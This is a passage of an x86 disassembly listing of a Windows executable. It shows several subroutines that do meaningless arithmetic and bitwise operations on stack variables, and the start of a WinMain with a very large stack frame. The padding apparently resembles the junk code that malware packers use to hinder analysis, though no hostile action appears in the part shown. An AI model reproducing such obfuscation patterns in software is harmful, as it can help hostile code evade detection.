		call	ds:FillRgn
		add	eax, 5Dh
		mov	[ebp+var_194], eax
		mov	ecx, [ebp+arg_4]
		mov	[ebp+var_20], ecx
		mov	edx, [ebp+var_248]
		add	edx, 19h
		mov	[ebp+var_98], edx
		movzx	eax, [ebp+var_1A1]
		movzx	ecx, [ebp+var_1AD]
		add	ecx, 0B8h
		xor	eax, ecx
		mov	[ebp+var_10D], al
		mov	edx, 29h
		sub	edx, [ebp+var_108]
		movzx	eax, [ebp+var_1AD]
		lea	ecx, [edx+eax-37h]
		and	ecx, 43h
		mov	[ebp+var_D9], cl
		mov	edx, [ebp+var_24C]
		add	edx, 39h
		mov	[ebp+arg_10], edx
		mov	eax, [ebp+var_20]
		add	eax, 83h
		mov	[ebp+var_CC], eax
		movzx	ecx, [ebp+var_C8]
		movzx	edx, [ebp+var_F8]
		lea	eax, [ecx+edx+0Fh]
		mov	[ebp+var_B4], ax
		mov	ecx, [ebp+hdc]
		mov	edx, [ebp+arg_14]
		lea	eax, [edx+ecx-3Ch]
		mov	[ebp+var_D8], ax
		movzx	ecx, [ebp+var_EC]
		add	ecx, 22h
		mov	dword_42C050, ecx
		mov	eax, [ebp+var_98]
		mov	esp, ebp
		pop	ebp
		retn
sub_40FF80	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4100E0	proc near		; CODE XREF: sub_409B10+C3p
					; sub_409DF0+B70p ...

var_24C		= word ptr -24Ch
var_248		= word ptr -248h
var_238		= word ptr -238h
var_204		= dword	ptr -204h
var_1BC		= dword	ptr -1BCh
var_1B5		= byte ptr -1B5h
var_1A8		= word ptr -1A8h
var_118		= word ptr -118h
var_114		= dword	ptr -114h
var_10A		= byte ptr -10Ah
var_104		= word ptr -104h
var_F4		= dword	ptr -0F4h
var_E9		= byte ptr -0E9h
var_D4		= dword	ptr -0D4h
var_C8		= dword	ptr -0C8h
var_C1		= byte ptr -0C1h
var_B4		= word ptr -0B4h
var_A4		= dword	ptr -0A4h
var_A0		= dword	ptr -0A0h
var_99		= byte ptr -99h
var_70		= dword	ptr -70h
var_20		= dword	ptr -20h
var_5		= byte ptr -5
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 254h
		mov	eax, [ebp+arg_0]
		sub	eax, 2Ah
		mov	[ebp+var_A4], eax
		mov	[ebp+var_204], 38h
		movzx	ecx, [ebp+var_B4]
		mov	edx, [ebp+var_1BC]
		sub	edx, ecx
		add	edx, 1Ch
		movzx	eax, [ebp+var_1A8]
		sub	edx, eax
		mov	[ebp+var_24C], dx
		mov	ecx, 5Eh
		sub	ecx, [ebp+var_C8]
		sub	ecx, [ebp+var_D4]
		xor	ecx, 1
		mov	[ebp+var_104], cx
		mov	edx, [ebp+arg_4]
		sub	edx, 7
		or	edx, 0FFFFFF94h
		mov	[ebp+var_10A], dl
		movzx	eax, [ebp+var_238]
		and	eax, [ebp+var_F4]
		mov	[ebp+var_99], al
		movzx	ecx, [ebp+var_118]
		mov	[ebp+arg_4], ecx
		movzx	edx, [ebp+var_1B5]
		sub	edx, [ebp+var_A0]
		mov	[ebp+var_1B5], dl
		mov	eax, [ebp+var_1BC]
		sub	eax, [ebp+var_114]
		add	eax, 2Bh
		sub	eax, [ebp+var_F4]
		sub	eax, [ebp+var_F4]
		mov	[ebp+var_C1], al
		movzx	ecx, [ebp+var_248]
		xor	ecx, 49h
		mov	[ebp+arg_4], ecx
		movzx	edx, [ebp+var_5]
		or	edx, 46h
		mov	[ebp+var_1BC], edx
		mov	[ebp+var_70], 2Dh
		mov	eax, 4Dh
		sub	eax, [ebp+var_F4]
		mov	[ebp+var_A0], eax
		mov	ecx, [ebp+var_C8]
		add	ecx, [ebp+var_20]
		sub	ecx, [ebp+var_A0]
		sub	ecx, [ebp+var_20]
		sub	ecx, 0Fh
		mov	[ebp+var_E9], cl
		mov	edx, [ebp+var_C8]
		add	edx, [ebp+var_F4]
		and	edx, 63h
		mov	[ebp+var_248], dx
		mov	eax, [ebp+var_A0]
		mov	esp, ebp
		pop	ebp
		retn
sub_4100E0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_410210	proc near		; CODE XREF: sub_4092F0+16Ap
					; sub_4098E0+D5p ...

var_240		= dword	ptr -240h
var_23C		= word ptr -23Ch
var_238		= word ptr -238h
var_1F8		= dword	ptr -1F8h
var_1B4		= word ptr -1B4h
var_1B0		= dword	ptr -1B0h
var_1A9		= byte ptr -1A9h
var_19C		= word ptr -19Ch
var_190		= word ptr -190h
var_118		= dword	ptr -118h
var_110		= word ptr -110h
var_108		= word ptr -108h
var_104		= dword	ptr -104h
var_FD		= byte ptr -0FDh
var_FC		= word ptr -0FCh
var_EC		= word ptr -0ECh
var_E5		= byte ptr -0E5h
var_DC		= word ptr -0DCh
var_D4		= word ptr -0D4h
var_CC		= word ptr -0CCh
var_C0		= dword	ptr -0C0h
var_B9		= byte ptr -0B9h
var_B8		= word ptr -0B8h
var_9C		= word ptr -9Ch
var_90		= word ptr -90h
var_8C		= dword	ptr -8Ch
var_7C		= dword	ptr -7Ch
var_74		= dword	ptr -74h
var_10		= dword	ptr -10h
var_6		= byte ptr -6
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 244h
		movzx	eax, [ebp+var_E5]
		xor	eax, 4Dh
		or	eax, 13h
		movzx	ecx, [ebp+var_CC]
		or	ecx, eax
		mov	[ebp+var_CC], cx
		movzx	edx, [ebp+var_EC]
		movzx	eax, [ebp+var_23C]
		sub	edx, eax
		movzx	ecx, [ebp+var_90]
		lea	edx, [ecx+edx-50h]
		mov	[ebp+var_90], dx
		mov	eax, [ebp+arg_C]
		sub	eax, 38h
		and	eax, 10h
		mov	[ebp+var_240], eax
		mov	ecx, [ebp+var_C0]
		sub	ecx, 13h
		mov	[ebp+arg_4], ecx
		movzx	edx, [ebp+var_1B4]
		add	edx, 32h
		xor	edx, 5
		mov	[ebp+var_B9], dl
		movzx	eax, [ebp+var_108]
		movzx	ecx, [ebp+var_9C]
		lea	edx, [ecx+eax-59h]
		mov	[ebp+var_9C], dx
		mov	eax, [ebp+var_8C]
		add	eax, 0B1h
		mov	[ebp+var_238], ax
		movzx	ecx, [ebp+var_D4]
		mov	edx, [ebp+arg_10]
		lea	eax, [edx+ecx+34h]
		or	eax, [ebp+var_10]
		mov	[ebp+var_19C], ax
		mov	ecx, [ebp+arg_10]
		mov	[ebp+var_104], ecx
		movzx	edx, [ebp+var_FC]
		movzx	eax, [ebp+var_190]
		sub	edx, eax
		add	edx, [ebp+var_4]
		movzx	ecx, [ebp+var_6]
		lea	edx, [edx+ecx+18h]
		mov	[ebp+var_1A9], dl
		movzx	eax, [ebp+var_23C]
		mov	ecx, [ebp+arg_8]
		lea	edx, [eax+ecx+65h]
		mov	[ebp+var_110], dx
		mov	[ebp+var_1B0], 4Dh
		mov	eax, [ebp+arg_C]
		mov	[ebp+var_1F8], eax
		mov	[ebp+arg_10], 78h
		mov	ecx, [ebp+var_118]
		add	ecx, [ebp+var_104]
		sub	ecx, [ebp+arg_8]
		movzx	edx, [ebp+var_DC]
		lea	eax, [ecx+edx-9]
		mov	[ebp+var_FD], al
		mov	[ebp+arg_4], 59h
		movzx	ecx, word ptr [ebp+arg_10]
		mov	[ebp+arg_8], ecx
		mov	[ebp+var_74], 18h
		mov	edx, [ebp+var_C0]
		sub	edx, [ebp+arg_8]
		xor	edx, 57h
		mov	eax, [ebp+arg_0]
		add	eax, 44h
		xor	edx, eax
		mov	[ebp+var_1A9], dl
		mov	ecx, [ebp+var_8C]
		sub	ecx, 26h
		and	ecx, 4Dh
		or	ecx, 35h
		mov	[ebp+var_E5], cl
		movzx	edx, word ptr [ebp+arg_10]
		mov	[ebp+arg_10], edx
		mov	eax, [ebp+var_118]
		mov	[ebp+var_7C], eax
		mov	ecx, 12h
		sub	ecx, [ebp+arg_8]
		add	ecx, 0Ah
		mov	[ebp+var_108], cx
		mov	edx, [ebp+arg_10]
		xor	edx, 0FFFFFFE4h
		movzx	eax, [ebp+var_B8]
		add	eax, edx
		mov	[ebp+var_B8], ax
		mov	eax, [ebp+var_118]
		mov	esp, ebp
		pop	ebp
		retn
sub_410210	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4103D0	proc near		; CODE XREF: sub_409DF0+464p

var_26C		= dword	ptr -26Ch
var_268		= dword	ptr -268h
var_260		= dword	ptr -260h
var_254		= dword	ptr -254h
var_244		= word ptr -244h
var_228		= dword	ptr -228h
var_1E8		= dword	ptr -1E8h
var_1CC		= dword	ptr -1CCh
var_1B9		= byte ptr -1B9h
var_1B8		= word ptr -1B8h
var_1AC		= dword	ptr -1ACh
var_1A8		= word ptr -1A8h
var_18C		= dword	ptr -18Ch
var_12C		= dword	ptr -12Ch
var_104		= word ptr -104h
var_EC		= word ptr -0ECh
var_D8		= dword	ptr -0D8h
var_D1		= byte ptr -0D1h
var_D0		= word ptr -0D0h
var_AC		= dword	ptr -0ACh
var_A8		= dword	ptr -0A8h
var_60		= dword	ptr -60h
var_44		= word ptr -44h
var_28		= dword	ptr -28h
var_21		= byte ptr -21h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_7		= byte ptr -7
var_5		= byte ptr -5
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 26Ch
		mov	[ebp+var_26C], 0
		jmp	short loc_4103F4
; ---------------------------------------------------------------------------

loc_4103E5:				; CODE XREF: sub_4103D0+C1j
		mov	eax, [ebp+var_26C]
		add	eax, 1
		mov	[ebp+var_26C], eax

loc_4103F4:				; CODE XREF: sub_4103D0+13j
		cmp	[ebp+var_26C], 0Eh
		jge	loc_410496
		mov	ecx, [ebp+arg_C]
		sub	ecx, 3Eh
		mov	[ebp+var_1CC], ecx
		mov	edx, [ebp+var_12C]
		cmp	edx, dword_42C000
		jg	short loc_410432
		mov	eax, [ebp+arg_4]
		mov	ecx, [ebp+arg_C]
		lea	edx, [ecx+eax-23h]
		sub	edx, [ebp+var_A8]
		mov	[ebp+var_EC], dx

loc_410432:				; CODE XREF: sub_4103D0+49j
		mov	eax, [ebp+arg_0]
		and	eax, 48h
		mov	[ebp+var_10], eax
		mov	ecx, [ebp+arg_0]
		mov	edx, [ebp+var_28]
		lea	eax, [edx+ecx-5Bh]
		sub	eax, [ebp+arg_4]
		mov	[ebp+var_D0], ax
		mov	ecx, [ebp+var_A8]
		mov	[ebp+var_60], ecx
		mov	edx, [ebp+arg_4]
		sub	edx, 1Fh
		xor	edx, 28h
		mov	[ebp+var_260], edx
		mov	eax, [ebp+var_268]
		sub	eax, [ebp+arg_0]
		sub	eax, 0Ch
		mov	[ebp+var_4], eax
		mov	ecx, [ebp+arg_8]
		add	ecx, 60h
		sub	ecx, [ebp+var_D8]
		mov	[ebp+var_4], ecx
		mov	edx, [ebp+var_10]
		sub	edx, [ebp+var_AC]
		mov	[ebp+arg_8], edx
		jmp	loc_4103E5
; ---------------------------------------------------------------------------

loc_410496:				; CODE XREF: sub_4103D0+2Bj
		mov	eax, [ebp+var_28]
		sub	eax, 40h
		mov	[ebp+arg_0], eax
		mov	ecx, [ebp+var_1AC]
		sub	ecx, 1Fh
		mov	[ebp+arg_0], ecx
		mov	edx, [ebp+var_1AC]
		sub	edx, 11h
		and	edx, [ebp+var_AC]
		mov	[ebp+var_260], edx
		mov	eax, [ebp+var_268]
		mov	ecx, [ebp+var_A8]
		lea	edx, [ecx+eax-11h]
		mov	[ebp+var_260], edx
		mov	eax, [ebp+arg_0]
		mov	[ebp+var_18C], eax
		mov	ecx, [ebp+arg_8]
		add	ecx, [ebp+arg_0]
		sub	ecx, [ebp+var_28]
		mov	[ebp+var_254], ecx
		mov	edx, 25h
		sub	edx, [ebp+arg_8]
		mov	[ebp+arg_C], edx
		mov	eax, [ebp+arg_C]
		mov	ecx, [ebp+var_D8]
		lea	edx, [ecx+eax-1]
		mov	[ebp+var_1B8], dx
		mov	eax, [ebp+var_AC]
		or	eax, 31h
		mov	ecx, 0Eh
		sub	ecx, [ebp+var_268]
		sub	ecx, 23h
		or	eax, ecx
		mov	[ebp+var_D1], al
		movzx	edx, word ptr [ebp+var_C]
		mov	[ebp+var_D8], edx
		mov	[ebp+var_228], 44h
		mov	eax, [ebp+var_10]
		add	eax, 0Bh
		mov	[ebp+var_AC], eax
		movzx	ecx, [ebp+var_104]
		movzx	edx, [ebp+var_7]
		lea	eax, [edx+ecx-3Eh]
		mov	[ebp+var_7], al
		mov	ecx, [ebp+arg_4]
		mov	[ebp+var_A8], ecx
		movzx	edx, [ebp+var_1B9]
		movzx	eax, [ebp+var_21]
		add	edx, eax
		mov	ecx, dword_42C050
		sub	ecx, edx
		mov	dword_42C050, ecx
		movzx	edx, [ebp+var_44]
		mov	[ebp+var_10], edx
		mov	[ebp+var_228], 4Ch
		mov	eax, [ebp+var_268]
		add	eax, [ebp+var_1CC]
		mov	[ebp+var_C], eax
		mov	ecx, [ebp+var_1AC]
		add	ecx, 50h
		sub	ecx, [ebp+var_28]
		mov	edx, [ebp+var_A8]
		lea	eax, [ecx+edx-34h]
		mov	[ebp+var_5], al
		mov	[ebp+var_28], 36h
		mov	ecx, [ebp+var_1AC]
		mov	[ebp+var_1CC], ecx
		mov	[ebp+var_1E8], 28h
		mov	edx, [ebp+arg_0]
		add	edx, [ebp+var_10]
		mov	[ebp+arg_C], edx
		movzx	eax, [ebp+var_1A8]
		mov	ecx, 4Bh
		sub	ecx, eax
		add	ecx, 4Fh
		movzx	edx, [ebp+var_104]
		sub	edx, ecx
		mov	[ebp+var_104], dx
		mov	[ebp+var_A8], 63h
		mov	eax, 22h
		mov	[ebp+var_244], ax
		mov	eax, [ebp+var_C]
		mov	esp, ebp
		pop	ebp
		retn
sub_4103D0	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
_WinMain@16	proc near		; CODE XREF: ___tmainCRTStartup+10Ep

var_3448	= dword	ptr -3448h
var_3444	= dword	ptr -3444h
var_3440	= dword	ptr -3440h
var_343C	= dword	ptr -343Ch
nSize		= dword	ptr -3438h
var_3431	= byte ptr -3431h
var_3430	= dword	ptr -3430h
var_342C	= word ptr -342Ch
var_3428	= word ptr -3428h
var_3424	= dword	ptr -3424h
var_3420	= dword	ptr -3420h
var_341C	= word ptr -341Ch
var_3414	= word ptr -3414h
var_3408	= dword	ptr -3408h
var_3404	= dword	ptr -3404h
var_33E8	= dword	ptr -33E8h
var_33DC	= dword	ptr -33DCh
var_33D8	= dword	ptr -33D8h
var_33C8	= dword	ptr -33C8h
var_33BC	= dword	ptr -33BCh
var_33B0	= dword	ptr -33B0h
var_33A8	= word ptr -33A8h
var_33A1	= byte ptr -33A1h
var_33A0	= dword	ptr -33A0h
var_339C	= word ptr -339Ch
var_3398	= qword	ptr -3398h
var_3390	= qword	ptr -3390h
var_3388	= qword	ptr -3388h
var_3380	= qword	ptr -3380h
var_3378	= qword	ptr -3378h
var_3370	= qword	ptr -3370h
var_3368	= qword	ptr -3368h
var_3360	= qword	ptr -3360h
var_3358	= qword	ptr -3358h
var_3350	= qword	ptr -3350h
var_3348	= qword	ptr -3348h
var_3340	= qword	ptr -3340h
var_3338	= qword	ptr -3338h
var_3330	= qword	ptr -3330h
var_3328	= qword	ptr -3328h
var_3320	= qword	ptr -3320h
var_3318	= qword	ptr -3318h
var_3310	= qword	ptr -3310h
var_3308	= qword	ptr -3308h
var_3300	= qword	ptr -3300h
var_32F8	= qword	ptr -32F8h
var_32F0	= qword	ptr -32F0h
var_32E8	= qword	ptr -32E8h
var_32E0	= qword	ptr -32E0h
var_32D8	= qword	ptr -32D8h
var_32D0	= qword	ptr -32D0h
var_32C8	= qword	ptr -32C8h
var_32C0	= qword	ptr -32C0h
var_32B8	= qword	ptr -32B8h
var_32B0	= qword	ptr -32B0h
var_32A8	= qword	ptr -32A8h
var_32A0	= qword	ptr -32A0h
var_3298	= qword	ptr -3298h
var_3290	= qword	ptr -3290h
var_3288	= qword	ptr -3288h
var_3280	= qword	ptr -3280h
var_3278	= qword	ptr -3278h
var_3270	= qword	ptr -3270h
var_3268	= qword	ptr -3268h
var_3260	= qword	ptr -3260h
var_3258	= qword	ptr -3258h
var_3250	= qword	ptr -3250h
var_3248	= qword	ptr -3248h
var_3240	= qword	ptr -3240h
var_3238	= qword	ptr -3238h
var_3230	= qword	ptr -3230h
var_3228	= qword	ptr -3228h
var_3220	= qword	ptr -3220h
var_3218	= qword	ptr -3218h
var_3210	= qword	ptr -3210h
var_3208	= qword	ptr -3208h
var_3200	= qword	ptr -3200h
var_31F8	= qword	ptr -31F8h
var_31F0	= qword	ptr -31F0h
var_31E8	= qword	ptr -31E8h
var_31E0	= qword	ptr -31E0h
var_31D8	= qword	ptr -31D8h
var_31D0	= qword	ptr -31D0h
var_31C8	= qword	ptr -31C8h
var_31C0	= qword	ptr -31C0h
var_31B8	= qword	ptr -31B8h
var_31B0	= qword	ptr -31B0h
var_31A8	= qword	ptr -31A8h
var_31A0	= qword	ptr -31A0h
var_3198	= qword	ptr -3198h
var_3190	= qword	ptr -3190h
var_3188	= qword	ptr -3188h
var_3180	= qword	ptr -3180h
var_3178	= qword	ptr -3178h
var_3170	= qword	ptr -3170h
var_3168	= qword	ptr -3168h
var_3160	= qword	ptr -3160h
var_3158	= qword	ptr -3158h
var_3150	= qword	ptr -3150h
var_3148	= qword	ptr -3148h
var_3140	= qword	ptr -3140h
var_3138	= qword	ptr -3138h
var_3130	= qword	ptr -3130h
var_3128	= qword	ptr -3128h
var_3120	= qword	ptr -3120h
var_3118	= qword	ptr -3118h
var_3110	= qword	ptr -3110h
var_3108	= qword	ptr -3108h
var_3100	= qword	ptr -3100h
var_30F8	= qword	ptr -30F8h
var_30F0	= qword	ptr -30F0h
var_30E8	= qword	ptr -30E8h
var_30E0	= qword	ptr -30E0h
var_30D8	= qword	ptr -30D8h
var_30D0	= qword	ptr -30D0h
var_30C8	= qword	ptr -30C8h
var_30C0	= qword	ptr -30C0h
var_30B8	= qword	ptr -30B8h
var_30B0	= qword	ptr -30B0h
var_30A8	= qword	ptr -30A8h
var_30A0	= qword	ptr -30A0h
var_3098	= qword	ptr -3098h
var_3090	= qword	ptr -3090h
var_3088	= qword	ptr -3088h
var_3080	= qword	ptr -3080h
var_3078	= qword	ptr -3078h
var_3070	= qword	ptr -3070h
var_3068	= qword	ptr -3068h
var_3060	= qword	ptr -3060h
var_3058	= qword	ptr -3058h
var_3050	= qword	ptr -3050h
var_3048	= qword	ptr -3048h
var_3040	= qword	ptr -3040h
var_3038	= qword	ptr -3038h
var_3030	= qword	ptr -3030h
var_3028	= qword	ptr -3028h
var_3020	= qword	ptr -3020h
var_3018	= qword	ptr -3018h
var_3010	= qword	ptr -3010h
var_3008	= qword	ptr -3008h
var_3000	= qword	ptr -3000h
var_2FF8	= qword	ptr -2FF8h
var_2FF0	= qword	ptr -2FF0h
var_2FE8	= qword	ptr -2FE8h
var_2FE0	= qword	ptr -2FE0h
var_2FD8	= qword	ptr -2FD8h
var_2FD0	= qword	ptr -2FD0h
var_2FC8	= qword	ptr -2FC8h
var_2FC0	= qword	ptr -2FC0h
var_2FB8	= qword	ptr -2FB8h
var_2FB0	= qword	ptr -2FB0h
var_2FA8	= qword	ptr -2FA8h
var_2FA0	= qword	ptr -2FA0h
var_2F98	= qword	ptr -2F98h
var_2F90	= qword	ptr -2F90h
var_2F88	= qword	ptr -2F88h
var_2F80	= qword	ptr -2F80h
var_2F78	= qword	ptr -2F78h
var_2F70	= qword	ptr -2F70h
var_2F68	= qword	ptr -2F68h
var_2F60	= qword	ptr -2F60h
var_2F58	= qword	ptr -2F58h
var_2F50	= qword	ptr -2F50h
var_2F48	= qword	ptr -2F48h
var_2F40	= qword	ptr -2F40h
var_2F38	= qword	ptr -2F38h
var_2F30	= qword	ptr -2F30h
var_2F28	= qword	ptr -2F28h
var_2F20	= qword	ptr -2F20h
var_2F18	= qword	ptr -2F18h
var_2F10	= qword	ptr -2F10h
var_2F08	= qword	ptr -2F08h
var_2F00	= qword	ptr -2F00h
var_2EF8	= qword	ptr -2EF8h
var_2EF0	= qword	ptr -2EF0h
var_2EE8	= qword	ptr -2EE8h
var_2EE0	= qword	ptr -2EE0h
var_2ED8	= qword	ptr -2ED8h
var_2ED0	= qword	ptr -2ED0h
var_2EC8	= qword	ptr -2EC8h
var_2EC0	= qword	ptr -2EC0h
var_2EB8	= qword	ptr -2EB8h
var_2EB0	= qword	ptr -2EB0h
var_2EA8	= qword	ptr -2EA8h
var_2EA0	= qword	ptr -2EA0h
var_2E98	= qword	ptr -2E98h
var_2E90	= qword	ptr -2E90h
var_2E88	= qword	ptr -2E88h
var_2E80	= qword	ptr -2E80h
var_2E78	= qword	ptr -2E78h
var_2E70	= qword	ptr -2E70h
var_2E68	= qword	ptr -2E68h
var_2E60	= qword	ptr -2E60h
var_2E58	= qword	ptr -2E58h
var_2E50	= qword	ptr -2E50h
var_2E48	= qword	ptr -2E48h
var_2E40	= qword	ptr -2E40h
var_2E38	= qword	ptr -2E38h
var_2E30	= qword	ptr -2E30h
var_2E28	= qword	ptr -2E28h
var_2E20	= qword	ptr -2E20h
var_2E18	= qword	ptr -2E18h
var_2E10	= qword	ptr -2E10h
var_2E08	= qword	ptr -2E08h
var_2E00	= qword	ptr -2E00h
var_2DF8	= qword	ptr -2DF8h
var_2DF0	= qword	ptr -2DF0h
var_2DE8	= qword	ptr -2DE8h
var_2DE0	= qword	ptr -2DE0h
var_2DD8	= qword	ptr -2DD8h
var_2DD0	= qword	ptr -2DD0h
var_2DC8	= qword	ptr -2DC8h
var_2DC0	= qword	ptr -2DC0h
var_2DB8	= qword	ptr -2DB8h
var_2DB0	= qword	ptr -2DB0h
var_2DA8	= qword	ptr -2DA8h
var_2DA0	= qword	ptr -2DA0h
var_2D98	= qword	ptr -2D98h
var_2D90	= qword	ptr -2D90h
var_2D88	= qword	ptr -2D88h
var_2D80	= qword	ptr -2D80h
var_2D78	= qword	ptr -2D78h
var_2D70	= qword	ptr -2D70h
var_2D68	= qword	ptr -2D68h
var_2D60	= qword	ptr -2D60h
var_2D58	= qword	ptr -2D58h
var_2D50	= qword	ptr -2D50h
var_2D48	= qword	ptr -2D48h
var_2D40	= qword	ptr -2D40h
var_2D38	= qword	ptr -2D38h
var_2D30	= qword	ptr -2D30h
var_2D28	= qword	ptr -2D28h
var_2D20	= qword	ptr -2D20h
var_2D18	= qword	ptr -2D18h
var_2D10	= qword	ptr -2D10h
var_2D08	= qword	ptr -2D08h
var_2D00	= qword	ptr -2D00h
var_2CF8	= qword	ptr -2CF8h
var_2CF0	= qword	ptr -2CF0h
var_2CE8	= qword	ptr -2CE8h
var_2CE0	= qword	ptr -2CE0h
var_2CD8	= qword	ptr -2CD8h
var_2CD0	= qword	ptr -2CD0h
var_2CC8	= qword	ptr -2CC8h
var_2CC0	= qword	ptr -2CC0h
var_2CB8	= qword	ptr -2CB8h
var_2CB0	= qword	ptr -2CB0h
var_2CA8	= qword	ptr -2CA8h
var_2CA0	= qword	ptr -2CA0h
var_2C98	= qword	ptr -2C98h
var_2C90	= qword	ptr -2C90h
var_2C88	= qword	ptr -2C88h
var_2C80	= qword	ptr -2C80h
var_2C78	= qword	ptr -2C78h
var_2C70	= qword	ptr -2C70h
var_2C68	= qword	ptr -2C68h
var_2C60	= qword	ptr -2C60h
var_2C58	= qword	ptr -2C58h
var_2C50	= qword	ptr -2C50h
var_2C48	= qword	ptr -2C48h
var_2C40	= qword	ptr -2C40h
var_2C38	= qword	ptr -2C38h
var_2C30	= qword	ptr -2C30h
var_2C28	= qword	ptr -2C28h
var_2C20	= qword	ptr -2C20h
var_2C18	= qword	ptr -2C18h
var_2C10	= qword	ptr -2C10h
var_2C08	= qword	ptr -2C08h
var_2C00	= qword	ptr -2C00h
var_2BF8	= qword	ptr -2BF8h
var_2BF0	= qword	ptr -2BF0h
var_2BE8	= qword	ptr -2BE8h
var_2BE0	= qword	ptr -2BE0h
var_2BD8	= qword	ptr -2BD8h
var_2BD0	= qword	ptr -2BD0h
var_2BC8	= qword	ptr -2BC8h
var_2BC0	= qword	ptr -2BC0h
var_2BB8	= qword	ptr -2BB8h
var_2BB0	= qword	ptr -2BB0h
var_2BA8	= qword	ptr -2BA8h
var_2BA0	= qword	ptr -2BA0h
var_2B98	= qword	ptr -2B98h
var_2B90	= qword	ptr -2B90h
var_2B88	= qword	ptr -2B88h
var_2B80	= qword	ptr -2B80h
var_2B78	= qword	ptr -2B78h
var_2B70	= qword	ptr -2B70h
var_2B68	= qword	ptr -2B68h
var_2B60	= qword	ptr -2B60h
var_2B58	= qword	ptr -2B58h
var_2B50	= qword	ptr -2B50h
var_2B48	= qword	ptr -2B48h
var_2B40	= qword	ptr -2B40h
var_2B38	= qword	ptr -2B38h
var_2B30	= qword	ptr -2B30h
var_2B28	= qword	ptr -2B28h
var_2B20	= qword	ptr -2B20h
var_2B18	= qword	ptr -2B18h
var_2B10	= qword	ptr -2B10h
var_2B08	= qword	ptr -2B08h
var_2B00	= qword	ptr -2B00h
var_2AF8	= qword	ptr -2AF8h
var_2AF0	= qword	ptr -2AF0h
var_2AE8	= qword	ptr -2AE8h
var_2AE0	= qword	ptr -2AE0h
var_2AD8	= qword	ptr -2AD8h
var_2AD0	= qword	ptr -2AD0h
var_2AC8	= qword	ptr -2AC8h
var_2AC0	= qword	ptr -2AC0h
var_2AB8	= qword	ptr -2AB8h
var_2AB0	= qword	ptr -2AB0h
var_2AA8	= qword	ptr -2AA8h
var_2AA0	= qword	ptr -2AA0h
var_2A98	= qword	ptr -2A98h
var_2A90	= qword	ptr -2A90h
var_2A88	= qword	ptr -2A88h
var_2A80	= qword	ptr -2A80h
var_2A78	= qword	ptr -2A78h
var_2A70	= qword	ptr -2A70h
var_2A68	= qword	ptr -2A68h
var_2A60	= qword	ptr -2A60h
var_2A58	= qword	ptr -2A58h
var_2A50	= qword	ptr -2A50h
var_2A48	= qword	ptr -2A48h
var_2A40	= qword	ptr -2A40h
var_2A38	= qword	ptr -2A38h
var_2A30	= qword	ptr -2A30h
var_2A28	= qword	ptr -2A28h
var_2A20	= qword	ptr -2A20h
var_2A18	= qword	ptr -2A18h
var_2A10	= qword	ptr -2A10h
var_2A08	= qword	ptr -2A08h
var_2A00	= qword	ptr -2A00h
var_29F8	= qword	ptr -29F8h
var_29F0	= qword	ptr -29F0h
var_29E8	= qword	ptr -29E8h
var_29E0	= qword	ptr -29E0h
var_29D8	= qword	ptr -29D8h
var_29D0	= qword	ptr -29D0h
var_29C8	= qword	ptr -29C8h
var_29C0	= qword	ptr -29C0h
var_29B8	= qword	ptr -29B8h
var_29B0	= qword	ptr -29B0h
var_29A8	= qword	ptr -29A8h
var_29A0	= qword	ptr -29A0h
var_2998	= qword	ptr -2998h
var_2990	= qword	ptr -2990h
var_2988	= qword	ptr -2988h
var_2980	= qword	ptr -2980h
var_2978	= qword	ptr -2978h
var_2970	= qword	ptr -2970h
var_2968	= qword	ptr -2968h
var_2960	= qword	ptr -2960h
var_2958	= qword	ptr -2958h
var_2950	= qword	ptr -2950h
var_2948	= qword	ptr -2948h
var_2940	= qword	ptr -2940h
var_2938	= qword	ptr -2938h
var_2930	= qword	ptr -2930h
var_2928	= qword	ptr -2928h
var_2920	= qword	ptr -2920h
var_2918	= qword	ptr -2918h
var_2910	= qword	ptr -2910h
var_2908	= qword	ptr -2908h
var_2900	= qword	ptr -2900h
var_28F8	= qword	ptr -28F8h
var_28F0	= qword	ptr -28F0h
var_28E8	= qword	ptr -28E8h
var_28E0	= qword	ptr -28E0h
var_28D8	= qword	ptr -28D8h
var_28D0	= qword	ptr -28D0h
var_28C8	= qword	ptr -28C8h
var_28C0	= qword	ptr -28C0h
var_28B8	= qword	ptr -28B8h
var_28B0	= qword	ptr -28B0h
var_28A8	= qword	ptr -28A8h
var_28A0	= qword	ptr -28A0h
var_2898	= qword	ptr -2898h
var_2890	= qword	ptr -2890h
var_2888	= qword	ptr -2888h
var_2880	= qword	ptr -2880h
var_2878	= qword	ptr -2878h
var_2870	= qword	ptr -2870h
var_2868	= qword	ptr -2868h
var_2860	= qword	ptr -2860h
var_2858	= qword	ptr -2858h
var_2850	= qword	ptr -2850h
var_2848	= qword	ptr -2848h
var_2840	= qword	ptr -2840h
var_2838	= qword	ptr -2838h
var_2830	= qword	ptr -2830h
var_2828	= qword	ptr -2828h
var_2820	= qword	ptr -2820h
var_2818	= qword	ptr -2818h
var_2810	= qword	ptr -2810h
var_2808	= qword	ptr -2808h
var_2800	= qword	ptr -2800h
var_27F8	= qword	ptr -27F8h
var_27F0	= qword	ptr -27F0h
var_27E8	= qword	ptr -27E8h
var_27E0	= qword	ptr -27E0h
var_27D8	= qword	ptr -27D8h
var_27D0	= qword	ptr -27D0h
var_27C8	= qword	ptr -27C8h
var_27C0	= qword	ptr -27C0h
var_27B8	= qword	ptr -27B8h
var_27B0	= qword	ptr -27B0h
var_27A8	= qword	ptr -27A8h
var_27A0	= qword	ptr -27A0h
